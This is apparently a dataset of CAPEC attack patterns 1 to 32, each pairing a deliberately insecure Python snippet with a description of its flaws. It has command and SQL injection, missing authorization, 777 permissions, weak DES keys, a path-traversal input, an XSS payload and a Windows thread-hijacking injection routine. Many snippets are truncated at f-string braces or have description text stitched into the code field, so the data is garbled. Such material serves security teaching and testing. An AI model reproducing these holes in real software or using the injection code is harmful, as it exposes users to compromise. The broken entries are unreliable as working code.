[
    {
        "capec_id": "1",
        "capec_name": "Accessing Functionality Not Properly Constrained by ACLs",
        "code_snippet": "\"\"\"\nimport os\nfrom flask import Flask, send_file, request\nfrom werkzeug.utils import secure_filename\n\napp = Flask(__name__)\nUPLOAD_FOLDER = '/uploads'\napp.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER\n\n@app.route('/admin/files/<path:filename>')\ndef serve_file(filename):\n    # Missing authorization check for admin functionality\n    return send_file(os.path.join(app.config['UPLOAD_FOLDER'], filename))\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    file = request.files['file']\n    filename = secure_filename(file.filename)\n    # Saving files without checking permissions or file type\n    file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))\n    # Setting world-writable permissions\n    os.chmod(os.path.join(app.config['UPLOAD_FOLDER'], filename), 0o777)\n    return 'File uploaded successfully'\n\nif __name__ == '__main__':\n    # Binding to all interfaces without restriction\n    app.run(host='0.0.0.0', port=5000)\n\"\"\",\n    \"description\": \"This vulnerable code demonstrates missing authorization controls and incorrect default permissions. It allows unrestricted access to admin file operations, permits file uploads without proper validation, sets unsafe file permissions, and binds the server to all network interfaces. The application lacks proper ACLs and authorization checks, allowing attackers to access sensitive functionality and files without proper authentication.\"",
        "description": "\"This vulnerable code demonstrates missing authorization controls and incorrect default permissions. It allows unrestricted access to admin file operations, permits file uploads without proper validation, sets unsafe file permissions, and binds the server to all network interfaces. The application lacks proper ACLs and authorization checks, allowing attackers to access sensitive functionality and files without proper authentication.\""
    },
    {
        "capec_id": "2",
        "capec_name": "Inducing Account Lockout",
        "code_snippet": "\"\"\"class UserAuthentication:\n    def __init__(self):\n        self.failed_attempts = {",
        "description": "\"This code demonstrates an overly restrictive account lockout mechanism that can be exploited for denial of service. The implementation has several vulnerabilities: a low threshold for account lockout (3 attempts), no lockout reset mechanism, weak password validation, and no rate limiting. An attacker can easily lock legitimate users out of their accounts by repeatedly submitting incorrect passwords.\""
    },
    {
        "capec_id": "3",
        "capec_name": "Using Leading 'Ghost' Character Sequences to Bypass Input Filters",
        "code_snippet": "def validate_filename(filename):\n    # Simple validation before canonicalization\n    if '..' in filename:\n        return False\n\n    # Remove leading whitespace and dots\n    cleaned_filename = filename.lstrip('. /')\n\n    # Basic path validation\n    allowed_chars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_.')\n    if not all(c in allowed_chars for c in cleaned_filename):\n        return False\n\n    return cleaned_filename\n\ndef read_file(user_input):\n    filename = validate_filename(user_input)\n    if filename:\n        try:\n            with open(filename, 'r') as f:\n                return f.read()\n        except:\n            return None\n    return None\n\n# Vulnerable usage\nuser_input = '....//etc/passwd'\ncontents = read_file(user_input)",
        "description": "This code is vulnerable to path traversal through ghost characters. The validation occurs before canonicalization, allowing an attacker to bypass security checks using leading dots and slashes. The validation strip happens after the initial security check, meaning an attacker could use '../' prefixed with additional dots to access unauthorized files. The code also fails to properly resolve path equivalence and handle alternate encodings."
    },
    {
        "capec_id": "4",
        "capec_name": "Using Alternative IP Address Encodings",
        "code_snippet": "\"\"\"\ndef authenticate_user(ip_address, request):\n    # Vulnerable authentication based on IP address\n    ALLOWED_IPS = ['192.168.1.1', '10.0.0.1']\n    \n    # Vulnerable handling of IP formats\n    if '.' in ip_address:\n        cleaned_ip = ip_address\n    elif 'http://' in ip_address:\n        cleaned_ip = ip_address.replace('http://', '')\n    else:\n        cleaned_ip = ip_address\n    \n    # Vulnerable reverse DNS lookup\n    try:\n        import socket\n        hostname = socket.gethostbyaddr(cleaned_ip)[0]\n        if hostname.endswith('.trusted-domain.com'):\n            return True\n    except:\n        pass\n    \n    # Vulnerable URI handling\n    if request.get('redirect_uri'):\n        uri = request.get('redirect_uri')\n        # No proper validation of URI encoding\n        if 'trusted-domain.com' in uri:\n            return True\n    \n    return cleaned_ip in ALLOWED_IPS\n\"\"\",\n    \"description\": \"This code demonstrates multiple vulnerabilities in handling IP addresses and authentication. It relies solely on IP addresses for authentication, improperly handles alternate IP formats, performs unsafe reverse DNS lookups, and has weak URI validation. The code accepts various formats of IP addresses without proper validation and uses insufficient checks for trusted domains.\"",
        "description": "\"This code demonstrates multiple vulnerabilities in handling IP addresses and authentication. It relies solely on IP addresses for authentication, improperly handles alternate IP formats, performs unsafe reverse DNS lookups, and has weak URI validation. The code accepts various formats of IP addresses without proper validation and uses insufficient checks for trusted domains.\""
    },
    {
        "capec_id": "5",
        "capec_name": "Blue Boxing",
        "code_snippet": "\"\"\"\nimport socket\n\nclass TelephoneSwitch:\n    def __init__(self):\n        self.is_supervisor = False\n        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        \n    def process_signal(self, signal):\n        # Vulnerable: No validation of signal authenticity\n        if signal == '2600':  # Frequency used in blue boxing\n            self.is_supervisor = True\n            return 'Supervisor access granted'\n            \n    def route_call(self, destination):\n        # Vulnerable: No verification of authorization\n        if self.is_supervisor:\n            return f'Routing call to {destination",
        "description": "\"A vulnerable telephone switch implementation that demonstrates multiple security flaws including lack of signal authentication, improper authorization checks, and susceptibility to replay attacks. The code accepts supervisor signals without proper verification, allowing unauthorized access through blue boxing techniques.\""
    },
    {
        "capec_id": "6",
        "capec_name": "Argument Injection",
        "code_snippet": "def process_user_command(user_input):\n    # Process command from user input without sanitization\n    command = 'echo ' + user_input\n    os.system(command)\n\ndef validate_input(user_data):\n    # Incomplete blacklist of dangerous characters\n    bad_chars = [';', '|']\n    for char in bad_chars:\n        if char in user_data:\n            return False\n    return True\n\ndef execute_query(query_params):\n    # Directly using input in SQL query\n    cursor.execute(f\"SELECT * FROM users WHERE id = {query_params}\")",
        "description": "This vulnerable code demonstrates multiple injection vulnerabilities through improper input validation and sanitization. It includes direct command injection through os.system(), incomplete blacklist validation, and SQL injection. The code fails to properly neutralize special characters and relies on an incomplete list of disallowed inputs, making it susceptible to various injection attacks."
    },
    {
        "capec_id": "7",
        "capec_name": "Blind SQL Injection",
        "code_snippet": "\"\"\"\ndef authenticate_user(username, password):\n    db = get_database_connection()\n    cursor = db.cursor()\n    \n    query = f\"SELECT * FROM users WHERE username = '{username",
        "description": "\"This code demonstrates a vulnerable login system that attempts to prevent SQL injection by suppressing error messages but remains susceptible to blind SQL injection. The code directly interpolates user input into the SQL query string without proper sanitization, allowing an attacker to probe the application through boolean-based responses, even without error messages. The true/false response from the authentication attempt provides enough information for an attacker to systematically test and exploit the vulnerability.\""
    },
    {
        "capec_id": "8",
        "capec_name": "Buffer Overflow in an API Call",
        "code_snippet": "def process_library_data(user_input):\n    buffer = bytearray(16)  # Fixed size buffer\n    input_data = user_input.encode()\n    \n    # Vulnerable library function that doesn't check bounds\n    def unsafe_copy(src, dst):\n        for i in range(len(src)):\n            dst[i] = src[i]  # No bounds checking\n    \n    # Vulnerable library function that processes commands\n    def process_command(cmd):\n        exec(cmd)  # Dangerous execution of untrusted input\n    \n    unsafe_copy(input_data, buffer)\n    process_command(buffer.decode())\n    return buffer",
        "description": "A vulnerable library implementation that demonstrates multiple security issues: a classic buffer overflow through unchecked buffer copying, improper memory boundary validation, and command injection. The code uses a fixed-size buffer but fails to validate input length, allowing buffer overflows. It also includes unsafe command execution of user input without proper sanitization."
    },
    {
        "capec_id": "9",
        "capec_name": "Buffer Overflow in Local Command-Line Utilities",
        "code_snippet": "\"\"\"\ndef execute_command(user_input):\n    buffer = bytearray(16)\n    command = f\\\"sudo {user_input",
        "description": "\"This vulnerable code demonstrates a command-line utility that processes user input without proper validation. It includes multiple vulnerabilities: buffer overflow through unchecked copying, command injection through unescaped user input, integer overflow in buffer allocation, and out-of-bounds memory access. The function attempts to execute commands with elevated privileges, making it a potential target for privilege escalation attacks.\""
    },
    {
        "capec_id": "10",
        "capec_name": "Buffer Overflow via Environment Variables",
        "code_snippet": "import os\n\ndef process_environment_data(env_var):\n    buffer = bytearray(64)\n    env_value = os.environ.get(env_var, '')\n    \n    # Vulnerable: No size checking before copy\n    for i in range(len(env_value)):\n        buffer[i] = ord(env_value[i])\n    \n    # Process the buffer assuming it contains trusted data\n    if buffer[0] == ord('A'):\n        admin_access = True\n        return buffer\n    \n    return None\n\ndef main():\n    # Attacker can control environment variable\n    result = process_environment_data('USER_DATA')",
        "description": "This vulnerable code demonstrates a buffer overflow through environment variable manipulation. It creates a fixed-size buffer but fails to check the input length before copying data from an environment variable. The code also assumes environment variables are trusted data sources, leading to potential authentication bypass. The buffer copy operation can write beyond allocated bounds if the environment variable is longer than 64 bytes."
    },
    {
        "capec_id": "11",
        "capec_name": "Cause Web Server Misclassification",
        "code_snippet": "\"\"\"\nimport os\nfrom flask import Flask, request, send_file\n\napp = Flask(__name__)\nUPLOAD_DIR = '/var/www/uploads/'\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    uploaded_file = request.files['file']\n    filename = uploaded_file.filename\n    \n    # Vulnerable: Blindly trusting file extension\n    extension = filename.split('.')[-1]\n    \n    if extension in ['txt', 'doc', 'pdf']:\n        filepath = os.path.join(UPLOAD_DIR, filename)\n        uploaded_file.save(filepath)\n        \n        # Vulnerable: Using extension to determine handler\n        if extension == 'txt':\n            return send_file(filepath, mimetype='text/plain')\n        elif extension == 'doc':\n            os.system(f'libreoffice --convert-to pdf {filepath",
        "description": "\"This vulnerable code demonstrates multiple file handling issues: it relies solely on file extensions for determining content type and processing logic, allows unrestricted file names, performs dangerous system commands based on user input, and implements unsafe file inclusion. The code fails to properly validate file types, allowing potential bypass of security controls through extension manipulation, and could lead to remote code execution or unauthorized file access.\""
    },
    {
        "capec_id": "12",
        "capec_name": "Choosing Message Identifier",
        "code_snippet": "\"\"\"\nimport socket\nimport json\nimport threading\n\nclass MessageBus:\n    def __init__(self):\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n        self.clients = {",
        "description": "\"A vulnerable message bus implementation that allows clients to spoof their identity, access privileged channels without authentication, and intercept sensitive information. The code lacks proper authentication, message integrity checks, and secure channel isolation, making it susceptible to identity spoofing and unauthorized access to privileged communications.\""
    },
    {
        "capec_id": "13",
        "capec_name": "Subverting Environment Variable Values",
        "code_snippet": "\"\"\"\nimport os\nimport subprocess\n\ndef run_privileged_command(user_input, env_vars=None):\n    # Allow environment variables to be passed directly without validation\n    if env_vars:\n        os.environ.update(env_vars)\n    \n    # Use environment variables without verification\n    db_password = os.getenv('DB_PASSWORD', 'default_password')\n    config_path = os.getenv('CONFIG_PATH', '/etc/app/config')\n    \n    # Construct command using unvalidated input\n    cmd = f'app_binary --config {config_path",
        "description": "\"This vulnerable code allows unrestricted modification of environment variables and uses them without validation in privileged operations. It demonstrates multiple security issues including environment variable manipulation, command injection, path traversal, and exposure of sensitive information. The code accepts external input for both command parameters and environment variables without proper validation or sanitization.\""
    },
    {
        "capec_id": "14",
        "capec_name": "Client-side Injection-induced Buffer Overflow",
        "code_snippet": "def handle_client_request(client_socket):\n    buffer = bytearray(64)\n    received_data = \"\"\n    while True:\n        chunk = client_socket.recv(1024)\n        if not chunk:\n            break\n        received_data += chunk.decode()\n        # Vulnerable: No size check before copy\n        buffer[0:len(received_data)] = received_data.encode()\n    \n    # Process buffer without bounds checking\n    index = int(received_data.split(',')[0])\n    buffer[index] = 0xFF  # Potential out-of-bounds write\n    \n    # Vulnerable: No input validation or sanitization\n    command = f\"process {received_data}\"\n    os.system(command)  # Command injection vulnerability\n    \n    return buffer",
        "description": "This code demonstrates a vulnerable client-server interaction where a buffer overflow can be triggered through malicious input. The code lacks proper input validation, buffer size checking, and contains multiple vulnerabilities including command injection and out-of-bounds memory access. The buffer copying operation doesn't verify input size against buffer capacity, and the index-based access lacks bounds checking."
    },
    {
        "capec_id": "15",
        "capec_name": "Command Delimiters",
        "code_snippet": "def execute_command(user_input):\n    # Attempt to block dangerous characters using a denylist\n    dangerous_chars = [';', '|', '&&', '>']\n    command_input = user_input\n    \n    for char in dangerous_chars:\n        command_input = command_input.replace(char, '')\n    \n    # Vulnerable: Still allows other shell metacharacters and escape sequences\n    final_command = f'find /data -name {command_input}'\n    os.system(final_command)",
        "description": "A vulnerable command execution function that relies on a denylist approach to filter dangerous characters. The code fails to properly sanitize all possible command delimiters and shell metacharacters, allowing attackers to bypass the filter using alternate delimiters or escape sequences not present in the denylist. This enables command injection attacks through user input."
    },
    {
        "capec_id": "16",
        "capec_name": "Dictionary-based Password Attack",
        "code_snippet": "def login_system(username):\n    attempts = 0\n    # Dictionary file containing common words/passwords\n    with open('dictionary.txt', 'r') as dict_file:\n        password_list = dict_file.readlines()\n    \n    user_password = get_user_password(username)  # Get stored password\n    \n    for password in password_list:\n        password = password.strip()\n        if password == user_password:\n            return True\n        attempts += 1\n    \n    return False\n\ndef create_account(username, password):\n    # No password complexity requirements\n    # No password expiration\n    # Single factor authentication only\n    save_user_credentials(username, password)\n    return True",
        "description": "This vulnerable code demonstrates multiple security issues: it allows dictionary-based password attacks without attempt limitation, lacks password complexity requirements, implements no password aging mechanism, uses single-factor authentication, and has no protection against brute force attempts. The login system simply compares passwords against a dictionary file without any rate limiting or account lockout mechanisms."
    },
    {
        "capec_id": "17",
        "capec_name": "Using Malicious Files",
        "code_snippet": "\"\"\"\nimport os\nimport shutil\nfrom flask import Flask, request\n\napp = Flask(__name__)\nUPLOAD_DIR = '/tmp/uploads'\n\n@app.route('/upload_and_execute', methods=['POST'])\ndef upload_and_execute():\n    if not os.path.exists(UPLOAD_DIR):\n        os.makedirs(UPLOAD_DIR)\n    \n    uploaded_file = request.files['file']\n    filepath = os.path.join(UPLOAD_DIR, uploaded_file.filename)\n    uploaded_file.save(filepath)\n    \n    # Change permissions to make file executable\n    os.chmod(filepath, 0o777)\n    \n    # Execute the uploaded file without validation\n    os.system(filepath)\n    \n    return 'File uploaded and executed successfully'\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)\n\"\"\",\n    \"description\": \"This vulnerable code allows unrestricted file upload and execution through a web interface. It creates a world-writable directory, saves uploaded files without validation, sets dangerous permissions (777), and executes files without checking their content or verifying user authorization. The code violates multiple security principles including proper permission management, authorization checks, and privilege control.\"",
        "description": "\"This vulnerable code allows unrestricted file upload and execution through a web interface. It creates a world-writable directory, saves uploaded files without validation, sets dangerous permissions (777), and executes files without checking their content or verifying user authorization. The code violates multiple security principles including proper permission management, authorization checks, and privilege control.\""
    },
    {
        "capec_id": "18",
        "capec_name": "XSS Targeting Non-Script Elements",
        "code_snippet": "\"\"\"from flask import Flask, render_template, request\n\napp = Flask(__name__)\n\n@app.route('/display_image')\ndef display_image():\n    # Get image URL from user input without proper sanitization\n    img_url = request.args.get('url', '')\n    \n    # Vulnerable template with unescaped image tag\n    html = f'''\n    <html>\n    <body>\n        <!-- Vulnerable to XSS via img tag attributes -->\n        <img src=\"{img_url",
        "description": "\"This code demonstrates a vulnerable web application that accepts user input for an image URL and renders it without proper sanitization. It's vulnerable to XSS attacks through the img tag's src attribute and error messages. An attacker could inject malicious JavaScript through the URL parameter, such as '1\\\" onerror=\\\"alert(1)' or other script-containing attributes.\""
    },
    {
        "capec_id": "19",
        "capec_name": "Embedding Scripts within Scripts",
        "code_snippet": "\"\"\"\nfrom flask import Flask, request, render_template_string\nimport requests\n\napp = Flask(__name__)\n\n@app.route('/')\ndef index():\n    # Get widget content from untrusted remote source\n    remote_widget = requests.get(request.args.get('widget_url', 'http://untrusted-source.com/widget.html')).text\n    \n    # Unsafely embed user-provided script and remote widget in template\n    template = f'''\n    <html>\n        <body>\n            <div>{remote_widget",
        "description": "\"This vulnerable code demonstrates an application that allows execution of untrusted remote scripts through multiple attack vectors. It combines improper access control (CWE-284), cross-site scripting (CWE-79), and inclusion of untrusted web functionality (CWE-830) by accepting user-provided scripts and remote widget URLs without proper validation or sanitization. The code uses unsafe template rendering and eval() to execute potentially malicious scripts, allowing for embedded malicious code execution (CWE-506).\""
    },
    {
        "capec_id": "20",
        "capec_name": "Encryption Brute Forcing",
        "code_snippet": "from Crypto.Cipher import DES\n\ndef encrypt_data(data):\n    # Weak encryption using DES with a hardcoded key and static IV\n    key = b'12345678'  # 8-byte weak key\n    iv = b'00000000'   # Static, predictable IV\n    \n    cipher = DES.new(key, DES.MODE_CBC, iv)\n    # Pad data to be multiple of 8 bytes\n    padded_data = data + (8 - len(data) % 8) * b'\\0'\n    encrypted = cipher.encrypt(padded_data)\n    return encrypted\n\ndef decrypt_data(encrypted_data):\n    key = b'12345678'  # Same weak key\n    iv = b'00000000'   # Same static IV\n    \n    cipher = DES.new(key, DES.MODE_CBC, iv)\n    decrypted = cipher.decrypt(encrypted_data)\n    return decrypted.rstrip(b'\\0')",
        "description": "This code demonstrates multiple cryptographic vulnerabilities: using the outdated DES algorithm (CWE-327), a weak 8-byte key that's hardcoded (CWE-321), and a static initialization vector (CWE-1204). The combination of these weaknesses makes the encryption susceptible to brute force attacks due to inadequate encryption strength (CWE-326). The static IV and predictable key significantly reduce the cryptographic protection mechanism's effectiveness (CWE-693)."
    },
    {
        "capec_id": "21",
        "capec_name": "Exploitation of Trusted Identifiers",
        "code_snippet": "from flask import Flask, session, request\n\napp = Flask(__name__)\napp.secret_key = 'hardcoded_secret'\n\nactive_sessions = {'admin': '12345'}\n\n@app.route('/login')\ndef login():\n    user_id = request.args.get('user')\n    session_id = request.args.get('session_id')\n    \n    if session_id in active_sessions.values():\n        session['user_id'] = user_id\n        session['session_id'] = session_id\n        session.permanent = True\n        return f'Welcome {user_id}!'\n    \n    return 'Invalid session'\n\n@app.route('/admin')\ndef admin_panel():\n    if session.get('session_id') in active_sessions.values():\n        return 'Admin panel access granted'\n    return 'Access denied'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This vulnerable code demonstrates weak session management where session IDs are predictable, not properly validated, and can be easily spoofed. It uses persistent sessions, performs insufficient session validation, and relies on client-provided session data without proper verification. The session IDs are stored in a simple dictionary and can be guessed or reused. The code also lacks proper session invalidation and relies on client-side security controls."
    },
    {
        "capec_id": "22",
        "capec_name": "Exploiting Trust in Client",
        "code_snippet": "class SimpleServer:\n    def __init__(self):\n        self.authorized_clients = ['client1', 'client2']\n        self.sensitive_data = {'secret': 'highly_confidential_info'}\n    \n    def handle_client_request(self, client_id, request):\n        # No validation of client_id format or authenticity\n        # No secure authentication mechanism\n        if client_id in self.authorized_clients:\n            # No input validation on request\n            if request == 'get_data':\n                return self.sensitive_data\n            \n    def process_message(self, message):\n        # Blindly trust client-provided data\n        client_id = message.get('client_id')\n        request = message.get('request')\n        return self.handle_client_request(client_id, request)\n\n# Usage\nserver = SimpleServer()\nmalicious_request = {'client_id': 'client1', 'request': 'get_data'}\nresponse = server.process_message(malicious_request)",
        "description": "This code demonstrates a vulnerable server implementation that fails to properly authenticate clients and validate input. It blindly trusts client-provided identifiers, lacks proper authentication mechanisms, and exposes sensitive data without adequate protection. The server accepts any message claiming to be from an authorized client without verification, making it susceptible to spoofing attacks."
    },
    {
        "capec_id": "23",
        "capec_name": "File Content Injection",
        "code_snippet": "from flask import Flask, request\nimport os\n\napp = Flask(__name__)\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    file = request.files['file']\n    filename = file.filename\n    \n    # Unsafe file handling - directly using user-supplied filename\n    upload_path = os.path.join('uploads', filename)\n    file.save(upload_path)\n    \n    # Dangerous automatic file processing\n    if filename.endswith('.pdf'):\n        os.system(f'pdf2text {upload_path}')\n    elif filename.endswith('.zip'):\n        os.system(f'unzip {upload_path}')\n    \n    return 'File uploaded successfully'",
        "description": "This vulnerable code demonstrates unsafe file upload handling that allows arbitrary file types without proper validation. It relies solely on file extensions for processing decisions and uses dangerous OS commands on untrusted files. The code is susceptible to path traversal, command injection, and malicious file execution through specially crafted filenames or content."
    },
    {
        "capec_id": "24",
        "capec_name": "Filter Failure through Buffer Overflow",
        "code_snippet": "\"\"\"\ndef process_filter(user_input):\n    buffer = bytearray(32)  # Fixed size buffer\n    input_data = user_input.encode()\n    \n    # Vulnerable: No size check before copy\n    for i in range(len(input_data)):\n        buffer[i] = input_data[i]  # Potential buffer overflow\n    \n    # Process filtered data\n    filtered_data = ''\n    for byte in buffer:\n        # Basic filter that can be overwhelmed\n        if byte >= 32 and byte <= 126:  # Printable ASCII\n            filtered_data += chr(byte)\n    \n    # Vulnerable command construction\n    cmd = f\"process {filtered_data",
        "description": "\"This code contains a vulnerable filter implementation that can be overwhelmed by oversized input. It uses a fixed-size buffer without proper bounds checking, leading to potential buffer overflow. The filter can fail when processing oversized transactions, potentially allowing unfiltered data to pass through to command execution.\""
    },
    {
        "capec_id": "25",
        "capec_name": "Forced Deadlock",
        "code_snippet": "\"\"\"\nimport threading\nimport time\n\nclass SharedResource:\n    def __init__(self):\n        self.lock_a = threading.Lock()\n        self.lock_b = threading.Lock()\n        self.data = 0\n\n    def process_a(self):\n        with self.lock_a:\n            time.sleep(0.1)  # Simulate some work\n            with self.lock_b:\n                self.data += 1\n\n    def process_b(self):\n        with self.lock_b:\n            time.sleep(0.1)  # Simulate some work\n            with self.lock_a:\n                self.data += 1\n\ndef run_processes():\n    resource = SharedResource()\n    thread1 = threading.Thread(target=resource.process_a)\n    thread2 = threading.Thread(target=resource.process_b)\n    \n    thread1.start()\n    thread2.start()\n    \n    thread1.join()\n    thread2.join()\n\nrun_processes()\n\"\"\",\n    \"description\": \"This code demonstrates a classic deadlock scenario where two threads acquire locks in different orders. Thread 1 acquires lock_a first and then attempts to acquire lock_b, while Thread 2 acquires lock_b first and then attempts to acquire lock_a. If both threads execute simultaneously, each thread may hold one lock while waiting for the other lock, resulting in a permanent deadlock condition.\"",
        "description": "\"This code demonstrates a classic deadlock scenario where two threads acquire locks in different orders. Thread 1 acquires lock_a first and then attempts to acquire lock_b, while Thread 2 acquires lock_b first and then attempts to acquire lock_a. If both threads execute simultaneously, each thread may hold one lock while waiting for the other lock, resulting in a permanent deadlock condition.\""
    },
    {
        "capec_id": "26",
        "capec_name": "Leveraging Race Conditions",
        "code_snippet": "\"\"\"\nimport os\nimport shutil\nimport threading\n\nclass FileProcessor:\n    def __init__(self, filename):\n        self.filename = filename\n        self.processed = False\n    \n    def check_and_process_file(self):\n        # Vulnerable check-then-act pattern\n        if os.path.exists(self.filename):  # Check\n            time.sleep(0.1)  # Artificial delay making race condition more likely\n            with open(self.filename, 'r') as f:  # Act\n                content = f.read()\n                self.process_content(content)\n                self.processed = True\n    \n    def process_content(self, content):\n        # Process the file content\n        with open('output.txt', 'w') as f:\n            f.write(content)\n\ndef malicious_thread(filename):\n    # Malicious thread that replaces the original file\n    while True:\n        if os.path.exists(filename):\n            os.remove(filename)\n            with open(filename, 'w') as f:\n                f.write('malicious content')\n            break\n\n# Usage that demonstrates race condition\nprocessor = FileProcessor('target.txt')\nwith open('target.txt', 'w') as f:\n    f.write('original content')\n\nt1 = threading.Thread(target=processor.check_and_process_file)\nt2 = threading.Thread(target=malicious_thread, args=('target.txt',))\n\nt1.start()\nt2.start()\n\"\"\",\n    \"description\": \"This code demonstrates a race condition vulnerability in file handling where a check-then-act pattern is used without proper synchronization. The FileProcessor class checks if a file exists and then tries to process it, but between the check and the actual processing, a malicious thread can replace the original file with a malicious one. This exemplifies CWE-363 (Race Condition Enabling Link Following) and CWE-362 (Race Condition Window). The lack of proper file locking mechanisms (CWE-667) and synchronization (CWE-662) allows an attacker to exploit the timing window between checking the file's existence and actually reading it.\"",
        "description": "\"This code demonstrates a race condition vulnerability in file handling where a check-then-act pattern is used without proper synchronization. The FileProcessor class checks if a file exists and then tries to process it, but between the check and the actual processing, a malicious thread can replace the original file with a malicious one. This exemplifies CWE-363 (Race Condition Enabling Link Following) and CWE-362 (Race Condition Window). The lack of proper file locking mechanisms (CWE-667) and synchronization (CWE-662) allows an attacker to exploit the timing window between checking the file's existence and actually reading it.\""
    },
    {
        "capec_id": "27",
        "capec_name": "Leveraging Race Conditions via Symbolic Links",
        "code_snippet": "\"\"\"\nimport os\nimport tempfile\n\ndef process_sensitive_file(sensitive_file_path):\n    # Create temporary file for processing\n    temp_path = '/tmp/processing_file'\n    \n    # Check if temporary file exists - TOCTOU vulnerability\n    if not os.path.exists(temp_path):\n        # Vulnerable window between check and creation\n        # An attacker can create a symlink here\n        with open(temp_path, 'w') as temp_file:\n            temp_file.write('sensitive data')\n        \n        # Process the file\n        with open(temp_path, 'r') as temp_file:\n            data = temp_file.read()\n            \n        # Write back to sensitive file without proper checks\n        with open(sensitive_file_path, 'w') as target_file:\n            target_file.write(data)\n            \n        os.remove(temp_path)\n    \"\"\",\n    \"description\": \"This code demonstrates a TOCTOU race condition vulnerability when handling temporary files. The code checks for the existence of a temporary file and then tries to create it, leaving a race window where an attacker could create a symbolic link in place of the temporary file. The link could point to a sensitive system file, causing the program to write to unauthorized locations. The code lacks proper file locking mechanisms and synchronization, making it vulnerable to symlink attacks.\"",
        "description": "\"This code demonstrates a TOCTOU race condition vulnerability when handling temporary files. The code checks for the existence of a temporary file and then tries to create it, leaving a race window where an attacker could create a symbolic link in place of the temporary file. The link could point to a sensitive system file, causing the program to write to unauthorized locations. The code lacks proper file locking mechanisms and synchronization, making it vulnerable to symlink attacks.\""
    },
    {
        "capec_id": "28",
        "capec_name": "Fuzzing",
        "code_snippet": "def process_user_command(user_input):\n    try:\n        # No input validation or sanitization\n        command = f'system_command {user_input}'\n        \n        # Dangerous direct execution of user input\n        result = os.system(command)\n        \n        # Revealing sensitive information in error messages\n        if result != 0:\n            error_msg = f'Command failed with system path: {os.getcwd()}\\nUser: {os.getlogin()}\\nCommand: {command}'\n            return error_msg\n            \n        return 'Command executed successfully'\n        \n    except Exception as e:\n        # Exposing stack trace and system details\n        return f'Error details: {str(e)}\\nSystem: {sys.platform}\\nPython: {sys.version}'",
        "description": "This code demonstrates multiple vulnerabilities that could be discovered through fuzzing: command injection due to unsanitized user input being directly executed, improper input validation with no checks on user input, and information disclosure through detailed error messages that expose system information. The code fails to implement input restrictions and reveals sensitive details about the execution environment when errors occur."
    },
    {
        "capec_id": "29",
        "capec_name": "Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions",
        "code_snippet": "import os\n\ndef check_and_read_file(filename):\n    # Check if file exists and has required permissions\n    if os.path.exists(filename) and os.access(filename, os.R_OK):\n        # Delay between check and use - vulnerable window\n        import time\n        time.sleep(1)  # Simulate some processing time\n        \n        # Attempt to read the file\n        try:\n            with open(filename, 'r') as file:\n                return file.read()\n        except Exception as e:\n            return str(e)\n\n# Usage\nfilename = 'sensitive_data.txt'\ncontents = check_and_read_file(filename)",
        "description": "This code demonstrates a classic Time-of-Check Time-of-Use (TOCTOU) race condition vulnerability. The code checks for file existence and permissions, but there's a time gap between the check and the actual file access. During this window, an attacker could modify, replace, or delete the file, potentially causing the program to operate on a different file than what was initially verified. The sleep() call artificially widens the race condition window to make the vulnerability more apparent."
    },
    {
        "capec_id": "30",
        "capec_name": "Hijacking a Privileged Thread of Execution",
        "code_snippet": "import ctypes\nimport platform\nimport os\n\ndef inject_malicious_code(target_pid):\n    # Get handle to target process\n    if platform.system() == 'Windows':\n        kernel32 = ctypes.windll.kernel32\n        PROCESS_ALL_ACCESS = 0x1F0FFF\n        handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, target_pid)\n        \n        # Allocate memory in target process\n        shellcode = b'\\x90\\x90\\x90'  # Example shellcode\n        addr = kernel32.VirtualAllocEx(handle, 0, len(shellcode), 0x1000, 0x40)\n        \n        # Write shellcode to allocated memory\n        kernel32.WriteProcessMemory(handle, addr, shellcode, len(shellcode), None)\n        \n        # Get thread handle and suspend it\n        thread_id = kernel32.GetThreadId(handle)\n        thread_handle = kernel32.OpenThread(0x0002, False, thread_id)\n        kernel32.SuspendThread(thread_handle)\n        \n        # Modify thread context to execute shellcode\n        context = ctypes.c_ulong()\n        kernel32.GetThreadContext(thread_handle, ctypes.byref(context))\n        context.Eip = addr\n        kernel32.SetThreadContext(thread_handle, ctypes.byref(context))\n        \n        # Resume thread execution\n        kernel32.ResumeThread(thread_handle)\n        \n    return True\n\ndef execute_privileged_action(pid):\n    try:\n        inject_malicious_code(pid)\n    except Exception as e:\n        pass",
        "description": "This code demonstrates thread hijacking by injecting malicious code into a running process. It uses Windows API calls to open a target process, allocate memory, write shellcode, suspend a thread, modify its execution context, and resume execution. The code exhibits multiple vulnerabilities including privilege context switching errors (CWE-270), process control issues (CWE-114), and potential OS command injection (CWE-78). The lack of proper synchronization also creates race conditions (CWE-362)."
    },
    {
        "capec_id": "31",
        "capec_name": "Accessing/Intercepting/Modifying HTTP Cookies",
        "code_snippet": "from flask import Flask, request, make_response\n\ndef set_auth_cookie(username, role):\n    response = make_response('Login successful')\n    # Storing sensitive data in cookies without encryption\n    auth_cookie = f'username={username};role={role}'\n    response.set_cookie('auth', auth_cookie)\n    return response\n\ndef verify_user(request):\n    auth_cookie = request.cookies.get('auth')\n    if auth_cookie:\n        # Assuming cookie data is trustworthy without validation\n        username, role = auth_cookie.split(';')\n        role = role.split('=')[1]\n        # No integrity checking of cookie values\n        if role == 'admin':\n            return True\n    return False\n\napp = Flask(__name__)\n\n@app.route('/admin')\ndef admin_panel():\n    # Relying on client-side cookie for authentication\n    if verify_user(request):\n        return 'Welcome to admin panel'\n    return 'Access denied'\n\n@app.route('/login')\ndef login():\n    # Setting persistent cookies with sensitive data\n    return set_auth_cookie('user123', 'admin')",
        "description": "This vulnerable code demonstrates insecure cookie handling by storing sensitive authentication data in cleartext cookies without encryption or integrity checking. It relies on client-side cookie values for authentication without proper validation, making it susceptible to cookie tampering and session hijacking. The code stores role information in cookies that can be modified by attackers, and performs security-critical operations based on unvalidated cookie data."
    },
    {
        "capec_id": "32",
        "capec_name": "XSS Through HTTP Query Strings",
